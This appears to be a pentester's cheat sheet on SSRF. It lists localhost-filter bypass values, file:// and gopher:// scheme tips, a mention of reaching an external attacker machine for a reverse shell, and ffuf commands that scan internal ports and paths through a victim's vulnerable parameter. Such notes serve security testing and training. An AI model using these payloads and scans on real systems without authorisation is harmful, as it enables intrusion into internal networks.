# SSRF

## Tips
- Enum ports and fuzz routes with SSRF on the local machine
- Identify other machines that this one has access to
- Use other schemes (like `file://`)
- Use the `gopher://` protocol for other methods than `GET`
  - `https://github.com/tarunkant/Gopherus`

## Restriction bypass
### localhost replacement
```
0.0.0.0
127.0.0.2
127.0.1.1
```
### Using @
```
# The the url might interpret the part before @ as credentials
http://<host>/?url=@0.0.0.0:1337/somewhere
```
### Using shortlinks
Using a shortlink generator may be used to target an external attacking machine to establish a reverse shell

## Fuzzing through SSRF
### Port scanning
```bash
seq 1 65535 > ports-wordlist.txt
```
```bash
ffuf -w ./ports-wordlist.txt -u http://<victim-host>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "targetserver=http://127.0.0.1:FUZZ" -fr "<string to filter out by>"
```
### Dirbusting
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -u http://<victim-host>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "targetserver=http://<internal-target>/FUZZ.php" -fr "<string to filter out by>"
```